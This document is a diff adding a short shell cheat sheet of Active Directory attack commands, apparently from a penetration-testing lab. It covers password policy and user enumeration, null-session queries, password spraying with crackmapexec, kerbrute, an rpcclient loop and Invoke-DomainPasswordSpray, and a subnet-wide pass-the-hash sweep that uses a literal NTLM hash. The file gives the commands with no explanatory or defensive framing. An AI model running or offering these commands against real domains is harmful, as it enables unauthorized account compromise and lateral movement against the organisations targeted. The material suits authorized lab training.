@@ -1,0 +1,20 @@
+#Enumerating & retriving password Policies 
+crackmapexec smb $(vselector dcip) -u $(vselector vuser) -p $(vselector vpass) --pass-pol
+rpcclient -U "" -N $(vselector dcip)
+enum4linux -P $(vselector dcip)
+ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+#User Enumeration 
+enum4linux -U $(vselector dcip)  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+crackmapexec smb $(vselector dcip) --users
+ldapsearch -h $(vselector dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+./windapsearch.py --dc-ip $(vselector dcip) -u "" -U
+kerbrute userenum -d $(vselector dcname) --dc $(vselector dcip) /opt/jsmith.txt 
+crackmapexec smb $(vselector dcname) -u $(vselector vuser) -p $(vselector vpass) --users
+#password Spraying from Linux Host 
+for u in $(cat $(vselector usernamepath));do rpcclient -U "$u%$(vselector spraypass)" -c "getusername;quit" $(vselector dcname) | grep Authority; done
+kerbrute passwordspray -d $(vselector dname) --dc $(vselector dcip) $(vselector usernamepath)  $(vselector spraypass)
+crackmapexec smb $(vselector dcip) -u $(vselector usernamepath) -p $(vselector sprypass) | grep +
+crackmapexec smb --local-auth $(vselector tsubnet) -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+# Internal Password Spraying - from Windows
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue 
+
